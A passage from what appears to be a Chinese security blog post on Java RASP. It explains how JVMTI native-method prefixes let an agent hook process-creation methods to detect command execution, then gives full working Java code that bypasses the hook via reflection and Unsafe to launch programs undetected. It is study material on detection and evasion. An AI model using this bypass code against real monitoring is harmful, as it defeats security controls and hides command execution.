forkAndExecMethod.invoke(processObject, ordinal, helperpath, prog, argBlock, argc,</span><br><span class="line">               envBlock, envc, dir, fds, redirectErrorStream);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">unsafe_getObject</span><span class="params">(Class&lt;? <span class="built_in">super</span> T&gt; objectClass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">       unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="keyword">return</span> (T) ((Unsafe) unsafeField.get(<span class="literal">null</span>)).allocateInstance(objectClass);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>运行后和 windows 绕过的情况一样，成功弹出记事本，而没有触发检测</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240321191830788.png"
                      alt="image-20240321191830788"
                ></p>
<h3 id="native"><a href="#native" class="headerlink" title="native"></a>native</h3><h4 id="hook-原理解析"><a href="#hook-原理解析" class="headerlink" title="hook 原理解析"></a>hook 原理解析</h4><p>因为native方法在class中字节码就是空的，所以我们使用 rasp 从修改方法体来说貌似就没办法防御住上面的绕过方式的。</p>
<p>但是在 JVMTI 中提供了一个方法setNativeMethodPrefix，可以用来设置native方法的解析前缀。</p>
<p>Java无法直接访问到操作系统底层如硬件系统，为此 Java提供了JNI来实现对于底层的访问。JNI，Java Native Interface，它是Java的SDK一部分，JNI允许Java代码使用以其他语言编写的代码和代码库，本地程序中的函数也可以调用Java层的函数，即 JNI 实现了 Java 和本地代码间的双向交互。Java不能直接调用系统函数，而是通过 forkAndExec 这个 native 函数（Linux 下）调用其用本地代码实现的方法：</p>
<p><a class="link"   href="https://github.com/JetBrains/jdk8u_jdk/blob/master/src/solaris/native/java/lang/UNIXProcess_md.c#L566" >https://github.com/JetBrains/jdk8u_jdk/blob/master/src/solaris/native/java/lang/UNIXProcess_md.c#L566 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240321204310963.png"
                      alt="image-20240321204310963"
                ></p>
<p>可以看出 native 方法解析到本地方法函数是由Java类的包名称和方法名称组成，这个规则这称之为：standard resolution（标准解析）。</p>
<p>通过 setNativeMethodPrefix 函数对 ClassFileTransformer 设置 native prefix，此时 JVM 将会使用动态解析方式。</p>
<p>比如，现有一个native方法在标准解析下为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">native boolean foo(int x); ====&gt; Java_somePackage_someClass_foo(JNIEnv* env, jint x);</span><br></pre></td></tr></table></figure></div>

<p>通过setNativeMethodPrefix函数设置了native prefix，且prefix为”wrapped_”</p>
<p>那么解析关系就会变为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">native boolean wrapped_foo(int x); ====&gt; Java_somePackage_someClass_foo(JNIEnv* env, jint x);</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/native_implemention.3566ed08.png"
                      alt="img.png"
                ></p>
<p>一旦可以找到对应的native实现，那么调用这个函数，整个解析过程就结束了；</p>
<p>如果没有找到，那么虚拟机将会做依次进行下面的解析工作（method 指的是 native 方法，nativeImplementation 指的是 C&#x2F;C++ 实现的方法）：</p>
<p>1）method(foo) -&gt; nativeImplementation(foo)</p>
<p>增加method的prefix，继续：</p>
<p>2）method(wrapped_foo) -&gt; nativeImplementation(foo)</p>
<p>增加 nativeImplementation的prefix，继续：</p>
<p>3）method(wrapped_foo) -&gt; nativeImplementation(wrapped_foo)</p>
<p>去掉 nativeImplementation 的 prefix，继续：</p>
<p>4）method(wrapped_foo) -&gt; nativeImplementation(foo)</p>
<p>如果找到上面的其中一个对应关系，则执行。否则，因为没有任何一个合适的解析方式，则这个过程失败。</p>
<p><strong>有多个 transformer场景</strong></p>
<p>虚拟机是按 transformer 被加入到的 Instrumentation 之中的次序去解析的（即addTransformer）。</p>
<p>假设有三个 transformer 要被加入进来，他们的次序和相对应的 prefix 分别为：transformer1 和“prefix1_”，transformer2 和 “prefix2_”，transformer3 和 “prefix3_”。 虚拟机做的解析规则为 :</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">prefix1_prefix2_prefix3_foo</span><span class="params">(<span class="type">int</span> x)</span>;  ====&gt; Java_somePackage_someClass_foo(JNIEnv* env, jint x);</span><br></pre></td></tr></table></figure></div>



<p>通过上面的过程，其实我们可以了解到当设置前缀后，如果原本的函数仍存在，则不会有任何影响，所以我们需要删除原 native 方法，编写具有前缀的 native 方法，此时第二个解析就能成功了，但是还需要去调用到这个 native 方法，所以我们还需要写一个同名称同参数的原方法，但是不要加上 native 修饰。</p>
<p>于是我们去 hook 一个 native 方法实际上就是如下过程：</p>
<ul>
<li><p>1.移除想要 hook 的 native 方法。</p>
</li>
<li><p>2.增加一个 native 方法，这个方法和 hook 的 native 方法除了方法名增加 prefix ，其他相同。</p>
</li>
<li><p>3.增加一个和 hook native 方法同名的 java 方法（除去其 native 修饰），其中返回时调用 prefix native方法。</p>
</li>
</ul>
<h4 id="hook-尝试"><a href="#hook-尝试" class="headerlink" title="hook 尝试"></a>hook 尝试</h4><p>agent 代码</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Hook._native;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] targetClassNameArray = &#123;<span class="string">&quot;java.lang.ProcessImpl&quot;</span>, <span class="string">&quot;java.lang.UNIXProcess&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> &#123;</span><br><span class="line">        <span class="type">AgentDemo</span> <span class="variable">transforme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AgentDemo</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">nativePrefix</span> <span class="operator">=</span> <span class="string">&quot;ko1sh1_&quot;</span>;</span><br><span class="line">        instrumentation.addTransformer(transforme, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (instrumentation.isNativeMethodPrefixSupported())&#123;</span><br><span class="line">            instrumentation.setNativeMethodPrefix(transforme, nativePrefix);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;The JVM does not support setting the native method prefix&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class[] classes = instrumentation.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas : classes) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Arrays.asList(targetClassNameArray).contains(clas.getName())) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    instrumentation.retransformClasses(clas);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Arrays.asList(targetClassNameArray).contains(className)) &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    clazz = pool.getCtClass(className);</span><br><span class="line">                    <span class="comment">// 添加新的前缀方法</span></span><br><span class="line">                    <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;long ko1sh1_create(String var1, String var2, String var3, long[] var4, boolean var5);&quot;</span>, clazz);</span><br><span class="line">                    method.setModifiers(Modifier.PRIVATE | Modifier.STATIC | Modifier.SYNCHRONIZED | Modifier.NATIVE);</span><br><span class="line">                    clazz.addMethod(method);</span><br><span class="line">                    <span class="comment">// 移除旧的方法</span></span><br><span class="line">                    <span class="type">CtMethod</span> <span class="variable">method1</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;create&quot;</span>);</span><br><span class="line">                    clazz.removeMethod(method1);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 添加原本的方法，但是不使用 native 修饰</span></span><br><span class="line">                    <span class="type">CtMethod</span> <span class="variable">method2</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;long create(String var1, String var2, String var3, long[] var4, boolean var5) throws java.io.IOException &#123; &quot;</span> +</span><br><span class="line">                            <span class="string">&quot;String a = ($w)$0; &quot;</span> +</span><br><span class="line">                            <span class="string">&quot;String b = ($w)$1; &quot;</span> +</span><br><span class="line">                            <span class="string">&quot;String c = ($w)$2; &quot;</span> +</span><br><span class="line">                            <span class="string">&quot;System.out.println(\&quot;检测到命令执行操作，内容为：\&quot;+a);&quot;</span>+</span><br><span class="line">                            <span class="string">&quot;return ko1sh1_create(a,b,c,new long[]&#123;-1,-1,-1&#125;,false); &quot;</span> +</span><br><span class="line">                            <span class="string">&quot;&#125;&quot;</span>, clazz);</span><br><span class="line">                    method2.setModifiers(Modifier.PRIVATE | Modifier.STATIC | Modifier.SYNCHRONIZED);</span><br><span class="line">                    clazz.addMethod(method2);</span><br><span class="line"></span><br><span class="line">                    <span class="type">byte</span>[] bytes = clazz.toBytecode();</span><br><span class="line">                    <span class="keyword">return</span> bytes;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="string">&quot;java.lang.UNIXProcess&quot;</span>.equals(className)) &#123;</span><br><span class="line">                        clazz = pool.getCtClass(className);</span><br><span class="line">                        <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;int ko1sh1_forkAndExec(int var1, byte[] var2, byte[] var3, byte[] var4, int var5, byte[] var6, int var7, byte[] var8, int[] var9, boolean var10);&quot;</span>, clazz);</span><br><span class="line">                        method.setModifiers(Modifier.PRIVATE | Modifier.NATIVE);</span><br><span class="line">                        clazz.addMethod(method);</span><br><span class="line"></span><br><span class="line">                        <span class="type">CtMethod</span> <span class="variable">method1</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;forkAndExec&quot;</span>);</span><br><span class="line">                        clazz.removeMethod(method1);</span><br><span class="line"></span><br><span class="line">                        <span class="type">CtMethod</span> <span class="variable">method2</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;int forkAndExec(int var1, byte[] var2, byte[] var3, byte[] var4, int var5, byte[] var6, int var7, byte[] var8, int[] var9, boolean var10) throws java.io.IOException &#123; System.out.println(\&quot;检测到系统命令执行，内容为: \&quot; + new java.lang.String(var3)); return this.ko1sh1_forkAndExec(var1, var2, var3, var4, var5, var6, var7, var8, var9, var10); &#125;&quot;</span>, clazz);</span><br><span class="line">                        method2.setModifiers(Modifier.PRIVATE);</span><br><span class="line">                        clazz.addMethod(method2);</span><br><span class="line"></span><br><span class="line">                        <span class="type">byte</span>[] bytes = clazz.toBytecode();</span><br><span class="line">                        <span class="keyword">return</span> bytes;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>尝试使用之前的方式进行绕过</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Hook._native;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">_OriginalByPass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;./src/main/java/Hook/_native/jars/agentmain.jar&quot;</span>;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor v:list)&#123;</span><br><span class="line">            <span class="keyword">if</span> (v.displayName().contains(<span class="string">&quot;_OriginalByPass&quot;</span>))&#123;</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(v.id());</span><br><span class="line">                vm.loadAgent(path);</span><br><span class="line">                System.out.println(<span class="string">&quot;---- 绕过操作 ----&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line"><span class="comment">//                    Runtime.getRuntime().exec(&quot;whoami&quot;);</span></span><br><span class="line">                    bypass_hook_windows(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//                    Runtime.getRuntime().exec(&quot;mousepad&quot;);</span></span><br><span class="line">                    bypass_hook_linux(<span class="string">&quot;mousepad&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                vm.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bypass_hook_windows</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdstr</span> <span class="operator">=</span> cmd;</span><br><span class="line">        <span class="type">String</span> <span class="variable">envblock</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dir</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">long</span>[] stdHandles = <span class="keyword">new</span> <span class="title class_">long</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="comment">// 这里将 redirectErrorStream 设置为 true 以便于将错误输出重定向到标准输出</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">redirectErrorStream</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">create</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;create&quot;</span>, String.class, String.class, String.class, <span class="type">long</span>[].class, <span class="type">boolean</span>.class);</span><br><span class="line">        create.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 由于 create 方法是静态方法，甚至都不用实例化对象就行。</span></span><br><span class="line">        create.invoke(<span class="literal">null</span>, cmdstr, envblock, dir, stdHandles, redirectErrorStream);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bypass_hook_linux</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">processObject</span> <span class="operator">=</span> unsafe_getObject(processClass);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">launchMechanism</span> <span class="operator">=</span> getFieldValue(processObject, <span class="string">&quot;launchMechanism&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> ((<span class="type">int</span>) launchMechanism.getClass().getMethod(<span class="string">&quot;ordinal&quot;</span>).invoke(launchMechanism)) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">byte</span>[] helperpath = getFieldValue(processObject, <span class="string">&quot;helperpath&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] prog = <span class="keyword">new</span> <span class="title class_">byte</span>[cmd.getBytes().length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(cmd.getBytes(), <span class="number">0</span>, prog, <span class="number">0</span>, cmd.getBytes().length);</span><br><span class="line">        <span class="type">byte</span>[] argBlock = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">argc</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">byte</span>[] envBlock = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">envc</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">byte</span>[] dir = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">int</span>[] fds = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">redirectErrorStream</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">forkAndExecMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;forkAndExec&quot;</span>, <span class="type">int</span>.class, <span class="type">byte</span>[].class,</span><br><span class="line">                <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>[].class, <span class="type">boolean</span>.class);</span><br><span class="line">        forkAndExecMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        forkAndExecMethod.invoke(processObject, ordinal, helperpath, prog, argBlock, argc,</span><br><span class="line">                envBlock, envc, dir, fds, redirectErrorStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">unsafe_getObject</span><span class="params">(Class&lt;? <span class="built_in">super</span> T&gt; objectClass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) ((Unsafe) unsafeField.get(<span class="literal">null</span>)).allocateInstance(objectClass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> (T) field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">            <span class="keyword">if</span> (field != <span class="literal">null</span>)</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!clazz.getSuperclass().equals(Object.class)) &#123;</span><br><span class="line">                <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240324144827295.png"
                      alt="image-20240324144827295"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240324144912864.png"
                      alt="image-20240324144912864"
                ></p>
<p>可以发现在 linux 下和 windows 下均被拦截检测到了。</p>
<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>通过上面的内容可以发现，其实本质上只是改变了执行命令的函数名称而已，只要我们能找到命令执行的函数名称（其实很好找到，因为都是加前缀，后面的内容就是原本函数的名字都不会变），就还是能绕过检测的，所以其实绕过很简单，只要反射不去调用 <code>create</code> 方法，而是去调用 <code>ko1sh1_create</code> 就行。所以只要在每次执行时进行检测就行，这里以方便的 windows 为例。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Hook._native;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">_ByPass1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;./src/main/java/Hook/_native/jars/agentmain.jar&quot;</span>;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor v:list)&#123;</span><br><span class="line">            <span class="keyword">if</span> (v.displayName().contains(<span class="string">&quot;_ByPass1&quot;</span>))&#123;</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(v.id());</span><br><span class="line">                vm.loadAgent(path);</span><br><span class="line">                <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    bypass_hook_windows(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bypass_hook_linux(<span class="string">&quot;mousepad&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                vm.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bypass_hook_windows</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdstr</span> <span class="operator">=</span> cmd;</span><br><span class="line">        <span class="type">String</span> <span class="variable">envblock</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dir</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">long</span>[] stdHandles = <span class="keyword">new</span> <span class="title class_">long</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="comment">// 这里将 redirectErrorStream 设置为 true 以便于将错误输出重定向到标准输出</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">redirectErrorStream</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (Method method : processClass.getDeclaredMethods()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (method.getName().endsWith(<span class="string">&quot;create&quot;</span>) &amp;&amp; !method.getName().equals(<span class="string">&quot;create&quot;</span>)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;修改后的方法名为：&quot;</span>+method.getName()+<span class="string">&quot;, 绕过成功！&quot;</span>);</span><br><span class="line">                method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                method.invoke(<span class="literal">null</span>, cmdstr, envblock, dir, stdHandles, redirectErrorStream);</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag)&#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">create</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;create&quot;</span>, String.class, String.class, String.class, <span class="type">long</span>[].class, <span class="type">boolean</span>.class);</span><br><span class="line">            create.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            create.invoke(<span class="literal">null</span>, cmdstr, envblock, dir, stdHandles, redirectErrorStream);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bypass_hook_linux</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">processObject</span> <span class="operator">=</span> unsafe_getObject(processClass);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">launchMechanism</span> <span class="operator">=</span> 